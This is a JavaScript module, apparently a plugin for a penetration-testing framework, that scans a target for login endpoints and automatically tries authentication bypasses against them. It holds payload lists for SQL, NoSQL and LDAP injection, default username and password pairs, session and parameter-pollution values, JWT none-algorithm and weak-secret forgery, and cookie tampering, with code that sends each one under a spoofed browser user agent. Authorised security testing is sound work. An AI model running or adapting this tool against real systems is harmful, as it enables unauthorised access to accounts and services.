const axios = require('axios');
const crypto = require('crypto');

class AuthBypassExploit {
    constructor() {
        this.displayName = 'Authentication Bypass Scanner';
        this.description = 'Comprehensive authentication bypass vulnerability detection and exploitation';
        this.severity = 'critical';
        this.category = 'authentication';
        this.version = '2.0.0';

        // Common authentication bypass techniques
        this.bypassTechniques = {
            // SQL injection in login forms
            sqlInjection: [
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR '1'='1'--",
                "' OR '1'='1'#",
                "' OR '1'='1'/*",
                "') OR ('1'='1'--",
                "') OR ('1'='1'#",
                "admin' OR 1=1--",
                "admin' OR 1=1#",
                "' OR 1=1 LIMIT 1--",
                "' UNION SELECT 1,'admin','password'--",
                "' UNION SELECT null,username,password FROM users--"
            ],

            // NoSQL injection bypasses
            nosqlInjection: [
                "[$ne]=null",
                "[$gt]=",
                "[$regex]=.*",
                "[$where]=this.username",
                "admin[$ne]=admin",
                "admin[$gt]=",
                "{\"$gt\":\"\"}",
                "{\"$ne\":null}",
                "{\"$regex\":\".*\"}",
                "{\"$where\":\"return true\"}"
            ],

            // LDAP injection
            ldapInjection: [
                "*",
                "*)(&",
                "*))%00",
                "admin)(&(password=*))",
                "admin)(&(objectClass=*)",
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin*",
                "*)|(objectClass=*"
            ],

            // Default credentials
            defaultCredentials: [
                { username: 'admin', password: 'admin' },
                { username: 'admin', password: 'password' },
                { username: 'admin', password: '123456' },
                { username: 'admin', password: 'admin123' },
                { username: 'administrator', password: 'administrator' },
                { username: 'root', password: 'root' },
                { username: 'root', password: 'toor' },
                { username: 'user', password: 'user' },
                { username: 'guest', password: 'guest' },
                { username: 'demo', password: 'demo' },
                { username: 'test', password: 'test' },
                { username: 'admin', password: '' },
                { username: '', password: 'admin' },
                { username: '', password: '' },
                { username: 'sa', password: '' },
                { username: 'oracle', password: 'oracle' },
                { username: 'postgres', password: 'postgres' },
                { username: 'mysql', password: 'mysql' },
                { username: 'admin', password: 'nimda' },
                { username: 'admin', password: 'root' }
            ],

            // Session manipulation
            sessionManipulation: [
                'admin=true',
                'authenticated=true',
                'logged_in=true',
                'user=admin',
                'role=admin',
                'privilege=admin',
                'access_level=9999',
                'is_admin=1',
                'user_id=1',
                'admin_user=yes'
            ],

            // Parameter pollution
            parameterPollution: [
                { param: 'username', values: ['user', 'admin'] },
                { param: 'password', values: ['wrong', 'admin'] },
                { param: 'role', values: ['user', 'admin'] },
                { param: 'access', values: ['0', '1'] }
            ],

            // Response manipulation indicators
            responseManipulation: [
                'success',
                'authenticated',
                'welcome',
                'dashboard',
                'profile',
                'admin',
                'logout',
                'settings'
            ]
        };

        // Common authentication endpoints
        this.authEndpoints = [
            '/login',
            '/signin',
            '/auth',
            '/authenticate',
            '/admin/login',
            '/user/login',
            '/api/login',
            '/api/auth',
            '/api/signin',
            '/admin/auth',
            '/portal/login',
            '/secure/login',
            '/account/login',
            '/user/signin',
            '/management/login',
            '/console/login'
        ];

        // JWT manipulation techniques
        this.jwtTechniques = {
            noneAlgorithm: 'none',
            algorithmConfusion: ['HS256', 'RS256', 'ES256'],
            weakSecrets: ['secret', 'key', 'jwt', 'token', '123456', 'password'],
            nullSignature: true,
            emptySignature: true
        };

        // Cookie manipulation patterns
        this.cookiePatterns = [
            'session',
            'sessionid',
            'auth',
            'token',
            'user',
            'login',
            'authenticated',
            'loggedin'
        ];
    }

    async execute(target, options = {}) {
        try {
            const startTime = Date.now();
            const results = {
                target,
                timestamp: new Date(),
                vulnerabilities: [],
                statistics: {
                    totalTests: 0,
                    sqlInjectionAttempts: 0,
                    defaultCredentialTests: 0,
                    sessionManipulationTests: 0,
                    jwtManipulationTests: 0,
                    successfulBypasses: 0
                },
                detailedResults: {}
            };

            console.log(`[AuthBypass] Starting authentication bypass scan on: ${target}`);

            // Step 1: Discover authentication endpoints
            const endpointDiscovery = await this.discoverAuthEndpoints(target, options);
            results.detailedResults.endpointDiscovery = endpointDiscovery;

            // Step 2: Test each discovered endpoint
            for (const endpoint of endpointDiscovery.endpoints) {
                console.log(`[AuthBypass] Testing endpoint: ${endpoint.url}`);

                // SQL Injection bypass attempts
                const sqlResults = await this.testSQLInjectionBypass(endpoint.url, options);
                results.detailedResults[`${endpoint.path}_sql`] = sqlResults;
                results.statistics.totalTests += sqlResults.tests.length;
                results.statistics.sqlInjectionAttempts += sqlResults.tests.length;
                results.vulnerabilities.push(...sqlResults.vulnerabilities);

                // NoSQL Injection bypass attempts
                const nosqlResults = await this.testNoSQLInjectionBypass(endpoint.url, options);
                results.detailedResults[`${endpoint.path}_nosql`] = nosqlResults;
                results.statistics.totalTests += nosqlResults.tests.length;
                results.vulnerabilities.push(...nosqlResults.vulnerabilities);

                // LDAP Injection bypass attempts
                const ldapResults = await this.testLDAPInjectionBypass(endpoint.url, options);
                results.detailedResults[`${endpoint.path}_ldap`] = ldapResults;
                results.statistics.totalTests += ldapResults.tests.length;
                results.vulnerabilities.push(...ldapResults.vulnerabilities);

                // Default credentials testing
                const credentialResults = await this.testDefaultCredentials(endpoint.url, options);
                results.detailedResults[`${endpoint.path}_credentials`] = credentialResults;
                results.statistics.totalTests += credentialResults.tests.length;
                results.statistics.defaultCredentialTests += credentialResults.tests.length;
                results.vulnerabilities.push(...credentialResults.vulnerabilities);

                // Session manipulation testing
                const sessionResults = await this.testSessionManipulation(endpoint.url, options);
                results.detailedResults[`${endpoint.path}_session`] = sessionResults;
                results.statistics.totalTests += sessionResults.tests.length;
                results.statistics.sessionManipulationTests += sessionResults.tests.length;
                results.vulnerabilities.push(...sessionResults.vulnerabilities);

                // Parameter pollution testing
                const pollutionResults = await this.testParameterPollution(endpoint.url, options);
                results.detailedResults[`${endpoint.path}_pollution`] = pollutionResults;
                results.statistics.totalTests += pollutionResults.tests.length;
                results.vulnerabilities.push(...pollutionResults.vulnerabilities);
            }

            // Step 3: JWT token manipulation (if JWT tokens are found)
            const jwtResults = await this.testJWTManipulation(target, options);
            results.detailedResults.jwtManipulation = jwtResults;
            results.statistics.totalTests += jwtResults.tests.length;
            results.statistics.jwtManipulationTests += jwtResults.tests.length;
            results.vulnerabilities.push(...jwtResults.vulnerabilities);

            // Step 4: Cookie manipulation testing
            const cookieResults = await this.testCookieManipulation(target, options);
            results.detailedResults.cookieManipulation = cookieResults;
            results.statistics.totalTests += cookieResults.tests.length;
            results.vulnerabilities.push(...cookieResults.vulnerabilities);

            results.statistics.successfulBypasses = results.vulnerabilities.length;
            results.executionTime = Date.now() - startTime;

            console.log(`[AuthBypass] Scan completed. Found ${results.vulnerabilities.length} vulnerabilities in ${results.executionTime}ms`);

            return results;

        } catch (error) {
            console.error('[AuthBypass] Scan failed:', error.message);
            throw error;
        }
    }

    async discoverAuthEndpoints(target, options) {
        const discovery = {
            endpoints: [],
            forms: []
        };

        try {
            const baseUrl = new URL(target);

            // Test common authentication endpoints
            for (const endpoint of this.authEndpoints) {
                try {
                    const testUrl = `${baseUrl.protocol}//${baseUrl.host}${endpoint}`;
                    const response = await this.makeRequest(testUrl, 'GET', {}, options);

                    if (response.status < 500) {
                        discovery.endpoints.push({
                            url: testUrl,
                            path: endpoint,
                            status: response.status,
                            hasForm: this.hasLoginForm(response.data)
                        });
                    }
                } catch (error) {
                    // Endpoint not accessible
                }

                if (options.delay) {
                    await this.sleep(options.delay);
                }
            }

            // Also check the main target for login forms
            try {
                const response = await this.makeRequest(target, 'GET', {}, options);
                if (this.hasLoginForm(response.data)) {
                    discovery.endpoints.push({
                        url: target,
                        path: new URL(target).pathname,
                        status: response.status,
                        hasForm: true
                    });
                }
            } catch (error) {
                // Target not accessible
            }

        } catch (error) {
            console.error('[AuthBypass] Endpoint discovery failed:', error.message);
        }

        return discovery;
    }

    async testSQLInjectionBypass(targetUrl, options) {
        const results = {
            type: 'sql_injection_bypass',
            tests: [],
            vulnerabilities: []
        };

        console.log(`[AuthBypass] Testing SQL injection bypass on: ${targetUrl}`);

        for (const payload of this.bypassTechniques.sqlInjection) {
            try {
                const loginData = {
                    username: payload,
                    password: 'test_password'
                };

                const response = await this.makeRequest(targetUrl, 'POST', loginData, options);

                const testResult = {
                    payload,
                    username: payload,
                    password: 'test_password',
                    statusCode: response.status,
                    responseLength: response.data ? response.data.length : 0,
                    bypassSuccessful: this.checkAuthenticationBypass(response),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.bypassSuccessful) {
                    results.vulnerabilities.push({
                        type: 'Authentication Bypass',
                        subtype: 'SQL Injection',
                        severity: 'critical',
                        target: targetUrl,
                        payload,
                        evidence: this.extractBypassEvidence(response),
                        impact: 'Complete authentication bypass allows unauthorized access',
                        recommendation: 'Use parameterized queries and proper input validation',
                        cwe: 'CWE-89',
                        owasp: 'A03:2021 – Injection'
                    });
                    console.log(`[AuthBypass] SQL injection bypass successful: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testNoSQLInjectionBypass(targetUrl, options) {
        const results = {
            type: 'nosql_injection_bypass',
            tests: [],
            vulnerabilities: []
        };

        console.log(`[AuthBypass] Testing NoSQL injection bypass on: ${targetUrl}`);

        for (const payload of this.bypassTechniques.nosqlInjection) {
            try {
                const loginData = {
                    username: payload,
                    password: 'test_password'
                };

                const response = await this.makeRequest(targetUrl, 'POST', loginData, options);

                const testResult = {
                    payload,
                    username: payload,
                    password: 'test_password',
                    statusCode: response.status,
                    bypassSuccessful: this.checkAuthenticationBypass(response),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.bypassSuccessful) {
                    results.vulnerabilities.push({
                        type: 'Authentication Bypass',
                        subtype: 'NoSQL Injection',
                        severity: 'critical',
                        target: targetUrl,
                        payload,
                        evidence: this.extractBypassEvidence(response),
                        impact: 'Complete authentication bypass in NoSQL database',
                        recommendation: 'Use proper NoSQL query validation and parameterization',
                        cwe: 'CWE-943',
                        owasp: 'A03:2021 – Injection'
                    });
                    console.log(`[AuthBypass] NoSQL injection bypass successful: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testLDAPInjectionBypass(targetUrl, options) {
        const results = {
            type: 'ldap_injection_bypass',
            tests: [],
            vulnerabilities: []
        };

        console.log(`[AuthBypass] Testing LDAP injection bypass on: ${targetUrl}`);

        for (const payload of this.bypassTechniques.ldapInjection) {
            try {
                const loginData = {
                    username: payload,
                    password: 'test_password'
                };

                const response = await this.makeRequest(targetUrl, 'POST', loginData, options);

                const testResult = {
                    payload,
                    username: payload,
                    password: 'test_password',
                    statusCode: response.status,
                    bypassSuccessful: this.checkAuthenticationBypass(response),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.bypassSuccessful) {
                    results.vulnerabilities.push({
                        type: 'Authentication Bypass',
                        subtype: 'LDAP Injection',
                        severity: 'high',
                        target: targetUrl,
                        payload,
                        evidence: this.extractBypassEvidence(response),
                        impact: 'Authentication bypass through LDAP injection',
                        recommendation: 'Use proper LDAP query escaping and validation',
                        cwe: 'CWE-90',
                        owasp: 'A03:2021 – Injection'
                    });
                    console.log(`[AuthBypass] LDAP injection bypass successful: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testDefaultCredentials(targetUrl, options) {
        const results = {
            type: 'default_credentials',
            tests: [],
            vulnerabilities: []
        };

        console.log(`[AuthBypass] Testing default credentials on: ${targetUrl}`);

        for (const creds of this.bypassTechniques.defaultCredentials) {
            try {
                const response = await this.makeRequest(targetUrl, 'POST', creds, options);

                const testResult = {
                    username: creds.username,
                    password: creds.password,
                    statusCode: response.status,
                    bypassSuccessful: this.checkAuthenticationBypass(response),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.bypassSuccessful) {
                    results.vulnerabilities.push({
                        type: 'Authentication Bypass',
                        subtype: 'Default Credentials',
                        severity: 'high',
                        target: targetUrl,
                        credentials: `${creds.username}:${creds.password}`,
                        evidence: this.extractBypassEvidence(response),
                        impact: 'System accessible using default credentials',
                        recommendation: 'Change all default passwords and implement strong password policies',
                        cwe: 'CWE-798',
                        owasp: 'A07:2021 – Identification and Authentication Failures'
                    });
                    console.log(`[AuthBypass] Default credentials successful: ${creds.username}:${creds.password}`);
                }

            } catch (error) {
                results.tests.push({
                    username: creds.username,
                    password: creds.password,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testSessionManipulation(targetUrl, options) {
        const results = {
            type: 'session_manipulation',
            tests: [],
            vulnerabilities: []
        };

        console.log(`[AuthBypass] Testing session manipulation on: ${targetUrl}`);

        for (const sessionData of this.bypassTechniques.sessionManipulation) {
            try {
                const loginData = {
                    username: 'test_user',
                    password: 'test_password',
                    [sessionData.split('=')[0]]: sessionData.split('=')[1]
                };

                const response = await this.makeRequest(targetUrl, 'POST', loginData, options);

                const testResult = {
                    sessionData,
                    statusCode: response.status,
                    bypassSuccessful: this.checkAuthenticationBypass(response),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.bypassSuccessful) {
                    results.vulnerabilities.push({
                        type: 'Authentication Bypass',
                        subtype: 'Session Manipulation',
                        severity: 'high',
                        target: targetUrl,
                        manipulation: sessionData,
                        evidence: this.extractBypassEvidence(response),
                        impact: 'Authentication bypass through session parameter manipulation',
                        recommendation: 'Implement proper session validation and server-side verification',
                        cwe: 'CWE-287',
                        owasp: 'A07:2021 – Identification and Authentication Failures'
                    });
                    console.log(`[AuthBypass] Session manipulation successful: ${sessionData}`);
                }

            } catch (error) {
                results.tests.push({
                    sessionData,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testParameterPollution(targetUrl, options) {
        const results = {
            type: 'parameter_pollution',
            tests: [],
            vulnerabilities: []
        };

        console.log(`[AuthBypass] Testing parameter pollution on: ${targetUrl}`);

        for (const pollution of this.bypassTechniques.parameterPollution) {
            try {
                // Create polluted parameters
                const pollutedData = new URLSearchParams();
                pollution.values.forEach(value => {
                    pollutedData.append(pollution.param, value);
                });

                // Add basic login data
                pollutedData.append('username', 'test_user');
                pollutedData.append('password', 'test_password');

                const response = await this.makeRequest(targetUrl, 'POST', pollutedData.toString(), options, {
                    'Content-Type': 'application/x-www-form-urlencoded'
                });

                const testResult = {
                    parameter: pollution.param,
                    values: pollution.values,
                    statusCode: response.status,
                    bypassSuccessful: this.checkAuthenticationBypass(response),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.bypassSuccessful) {
                    results.vulnerabilities.push({
                        type: 'Authentication Bypass',
                        subtype: 'Parameter Pollution',
                        severity: 'medium',
                        target: targetUrl,
                        parameter: pollution.param,
                        values: pollution.values,
                        evidence: this.extractBypassEvidence(response),
                        impact: 'Authentication bypass through HTTP parameter pollution',
                        recommendation: 'Implement proper parameter validation and handle duplicate parameters',
                        cwe: 'CWE-235',
                        owasp: 'A03:2021 – Injection'
                    });
                    console.log(`[AuthBypass] Parameter pollution successful: ${pollution.param}`);
                }

            } catch (error) {
                results.tests.push({
                    parameter: pollution.param,
                    values: pollution.values,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testJWTManipulation(target, options) {
        const results = {
            type: 'jwt_manipulation',
            tests: [],
            vulnerabilities: []
        };

        console.log(`[AuthBypass] Testing JWT manipulation on: ${target}`);

        try {
            // First, try to get a JWT token
            const response = await this.makeRequest(target, 'GET', {}, options);
            const jwtToken = this.extractJWTToken(response);

            if (jwtToken) {
                // Test algorithm confusion
                const algConfusionResult = await this.testJWTAlgorithmConfusion(target, jwtToken, options);
                results.tests.push(algConfusionResult);
                if (algConfusionResult.bypassSuccessful) {
                    results.vulnerabilities.push({
                        type: 'Authentication Bypass',
                        subtype: 'JWT Algorithm Confusion',
                        severity: 'high',
                        target,
                        originalToken: jwtToken.substring(0, 50) + '...',
                        evidence: algConfusionResult.evidence,
                        impact: 'JWT signature bypass through algorithm confusion',
                        recommendation: 'Enforce specific JWT algorithms and validate signatures properly',
                        cwe: 'CWE-347',
                        owasp: 'A02:2021 – Cryptographic Failures'
                    });
                }

                // Test weak secrets
                const weakSecretResult = await this.testJWTWeakSecret(target, jwtToken, options);
                results.tests.push(weakSecretResult);
                if (weakSecretResult.vulnerable) {
                    results.vulnerabilities.push({
                        type: 'Authentication Bypass',
                        subtype: 'JWT Weak Secret',
                        severity: 'critical',
                        target,
                        secret: weakSecretResult.secret,
                        evidence: weakSecretResult.evidence,
                        impact: 'JWT tokens can be forged using weak secrets',
                        recommendation: 'Use strong, cryptographically secure secrets for JWT signing',
                        cwe: 'CWE-326',
                        owasp: 'A02:2021 – Cryptographic Failures'
                    });
                }

                // Test none algorithm
                const noneAlgResult = await this.testJWTNoneAlgorithm(target, jwtToken, options);
                results.tests.push(noneAlgResult);
                if (noneAlgResult.bypassSuccessful) {
                    results.vulnerabilities.push({
                        type: 'Authentication Bypass',
                        subtype: 'JWT None Algorithm',
                        severity: 'critical',
                        target,
                        evidence: noneAlgResult.evidence,
                        impact: 'JWT signature verification bypassed using none algorithm',
                        recommendation: 'Disable none algorithm and enforce signature verification',
                        cwe: 'CWE-347',
                        owasp: 'A02:2021 – Cryptographic Failures'
                    });
                }
            }

        } catch (error) {
            results.tests.push({
                test: 'jwt_manipulation',
                error: error.message,
                timestamp: new Date()
            });
        }

        return results;
    }

    async testCookieManipulation(target, options) {
        const results = {
            type: 'cookie_manipulation',
            tests: [],
            vulnerabilities: []
        };

        console.log(`[AuthBypass] Testing cookie manipulation on: ${target}`);

        try {
            const response = await this.makeRequest(target, 'GET', {}, options);
            const cookies = this.extractCookies(response);

            for (const cookie of cookies) {
                if (this.isAuthenticationCookie(cookie.name)) {
                    // Test cookie value manipulation
                    const manipulationResult = await this.testCookieValueManipulation(target, cookie, options);
                    results.tests.push(manipulationResult);
                    if (manipulationResult.bypassSuccessful) {
                        results.vulnerabilities.push({
                            type: 'Authentication Bypass',
                            subtype: 'Cookie Manipulation',
                            severity: 'high',
                            target,
                            cookie: cookie.name,
                            manipulation: manipulationResult.manipulation,
                            evidence: manipulationResult.evidence,
                            impact: 'Authentication bypass through cookie value manipulation',
                            recommendation: 'Implement proper cookie validation and use secure session management',
                            cwe: 'CWE-565',
                            owasp: 'A07:2021 – Identification and Authentication Failures'
                        });
                    }
                }
            }

        } catch (error) {
            results.tests.push({
                test: 'cookie_manipulation',
                error: error.message,
                timestamp: new Date()
            });
        }

        return results;
    }

    hasLoginForm(responseData) {
        if (!responseData || typeof responseData !== 'string') {
            return false;
        }

        const loginIndicators = [
            /password/i,
            /username/i,
            /login/i,
            /signin/i,
            /authenticate/i,
            /type\s*=\s*["']password["']/i,
            /input[^>]*password/i
        ];

        return loginIndicators.some(indicator => indicator.test(responseData));
    }

    checkAuthenticationBypass(response) {
        if (!response) return false;

        // Check status code (successful login usually returns 200 or 302)
        if (response.status === 200 || response.status === 302) {
            // Check response content for success indicators
            if (response.data && typeof response.data === 'string') {
                const successIndicators = this.bypassTechniques.responseManipulation;
                return successIndicators.some(indicator =>
                    new RegExp(indicator, 'i').test(response.data)
                );
            }

            // Check for authentication cookies in response
            const cookies = response.headers['set-cookie'] || [];
            return cookies.some(cookie =>
                this.cookiePatterns.some(pattern =>
                    new RegExp(pattern, 'i').test(cookie)
                )
            );
        }

        return false;
    }

    extractBypassEvidence(response) {
        if (!response.data) return 'No response data';

        // Extract first 200 characters for evidence
        let evidence = response.data.substring(0, 200);

        // Look for specific success indicators
        const indicators = this.bypassTechniques.responseManipulation;
        for (const indicator of indicators) {
            const regex = new RegExp(indicator, 'i');
            if (regex.test(response.data)) {
                evidence += ` | Success indicator found: ${indicator}`;
                break;
            }
        }

        return evidence;
    }

    extractJWTToken(response) {
        if (!response.data) return null;

        // Look for JWT in response body
        const jwtRegex = /eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*/g;
        const matches = response.data.match(jwtRegex);

        if (matches && matches.length > 0) {
            return matches[0];
        }

        // Look for JWT in cookies
        const cookies = response.headers['set-cookie'] || [];
        for (const cookie of cookies) {
            const jwtMatch = cookie.match(jwtRegex);
            if (jwtMatch) {
                return jwtMatch[0];
            }
        }

        return null;
    }

    async testJWTAlgorithmConfusion(target, token, options) {
        try {
            // Decode JWT header
            const [header, payload, signature] = token.split('.');
            const decodedHeader = JSON.parse(Buffer.from(header, 'base64').toString());

            // Change algorithm to none
            const modifiedHeader = { ...decodedHeader, alg: 'none' };
            const newHeader = Buffer.from(JSON.stringify(modifiedHeader)).toString('base64url');
            const modifiedToken = `${newHeader}.${payload}.`;

            // Test with modified token
            const response = await this.makeRequest(target, 'GET', {}, {
                ...options,
                headers: {
                    ...options.headers,
                    'Authorization': `Bearer ${modifiedToken}`
                }
            });

            return {
                test: 'jwt_algorithm_confusion',
                originalAlgorithm: decodedHeader.alg,
                modifiedAlgorithm: 'none',
                bypassSuccessful: response.status === 200,
                evidence: `Modified JWT accepted with status ${response.status}`,
                timestamp: new Date()
            };

        } catch (error) {
            return {
                test: 'jwt_algorithm_confusion',
                error: error.message,
                timestamp: new Date()
            };
        }
    }

    async testJWTWeakSecret(target, token, options) {
        try {
            const jwt = require('jsonwebtoken');

            for (const secret of this.jwtTechniques.weakSecrets) {
                try {
                    // Try to verify the token with weak secret
                    const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });

                    if (decoded) {
                        return {
                            test: 'jwt_weak_secret',
                            vulnerable: true,
                            secret,
                            evidence: `JWT verified with weak secret: ${secret}`,
                            timestamp: new Date()
                        };
                    }
                } catch (error) {
                    // Secret didn't work, continue
                }
            }

            return {
                test: 'jwt_weak_secret',
                vulnerable: false,
                evidence: 'No weak secrets found',
                timestamp: new Date()
            };

        } catch (error) {
            return {
                test: 'jwt_weak_secret',
                error: error.message,
                timestamp: new Date()
            };
        }
    }

    async testJWTNoneAlgorithm(target, token, options) {
        try {
            const [header, payload] = token.split('.');
            const noneToken = `${header}.${payload}.`;

            const response = await this.makeRequest(target, 'GET', {}, {
                ...options,
                headers: {
                    ...options.headers,
                    'Authorization': `Bearer ${noneToken}`
                }
            });

            return {
                test: 'jwt_none_algorithm',
                bypassSuccessful: response.status === 200,
                evidence: `None algorithm token accepted with status ${response.status}`,
                timestamp: new Date()
            };

        } catch (error) {
            return {
                test: 'jwt_none_algorithm',
                error: error.message,
                timestamp: new Date()
            };
        }
    }

    extractCookies(response) {
        const cookies = [];
        const cookieHeaders = response.headers['set-cookie'] || [];

        for (const cookieHeader of cookieHeaders) {
            const [nameValue] = cookieHeader.split(';');
            const [name, value] = nameValue.split('=');
            if (name && value) {
                cookies.push({ name: name.trim(), value: value.trim() });
            }
        }

        return cookies;
    }

    isAuthenticationCookie(cookieName) {
        const lowerName = cookieName.toLowerCase();
        return this.cookiePatterns.some(pattern =>
            lowerName.includes(pattern)
        );
    }

    async testCookieValueManipulation(target, cookie, options) {
        try {
            // Try common admin values
            const adminValues = ['admin', 'administrator', '1', 'true', 'yes'];

            for (const adminValue of adminValues) {
                const response = await this.makeRequest(target, 'GET', {}, {
                    ...options,
                    headers: {
                        ...options.headers,
                        'Cookie': `${cookie.name}=${adminValue}`
                    }
                });

                if (this.checkAuthenticationBypass(response)) {
                    return {
                        test: 'cookie_value_manipulation',
                        bypassSuccessful: true,
                        originalValue: cookie.value,
                        manipulation: adminValue,
                        evidence: this.extractBypassEvidence(response),
                        timestamp: new Date()
                    };
                }
            }

            return {
                test: 'cookie_value_manipulation',
                bypassSuccessful: false,
                evidence: 'No successful cookie manipulations found',
                timestamp: new Date()
            };

        } catch (error) {
            return {
                test: 'cookie_value_manipulation',
                error: error.message,
                timestamp: new Date()
            };
        }
    }

    async makeRequest(url, method = 'GET', data = {}, options = {}, extraHeaders = {}) {
        const requestOptions = {
            method: method.toUpperCase(),
            url,
            timeout: options.timeout || 30000,
            headers: {
                'User-Agent': options.userAgent || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                ...options.headers,
                ...extraHeaders
            },
            validateStatus: () => true // Accept all status codes
        };

        if (method.toUpperCase() !== 'GET' && data) {
            if (typeof data === 'string') {
                requestOptions.data = data;
                requestOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            } else {
                requestOptions.data = new URLSearchParams(data).toString();
                requestOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            }
        }

        return await axios(requestOptions);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async getInfo() {
        return {
            name: this.displayName,
            description: this.description,
            version: this.version,
            severity: this.severity,
            category: this.category,
            techniques: [
                'SQL Injection Bypass',
                'NoSQL Injection Bypass',
                'LDAP Injection Bypass',
                'Default Credentials Testing',
                'Session Manipulation',
                'Parameter Pollution',
                'JWT Token Manipulation',
                'Cookie Value Manipulation'
            ],
            parameters: [
                {
                    name: 'delay',
                    description: 'Delay between requests in milliseconds',
                    type: 'number',
                    default: 100
                },
                {
                    name: 'timeout',
                    description: 'Request timeout in milliseconds',
                    type: 'number',
                    default: 30000
                },
                {
                    name: 'userAgent',
                    description: 'Custom User-Agent header',
                    type: 'string',
                    default: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            ],
            authEndpoints: this.authEndpoints.length,
            defaultCredentials: this.bypassTechniques.defaultCredentials.length,
            bypassTechniques: Object.keys(this.bypassTechniques).length
        };
    }
}

module.exports = AuthBypassExploit;
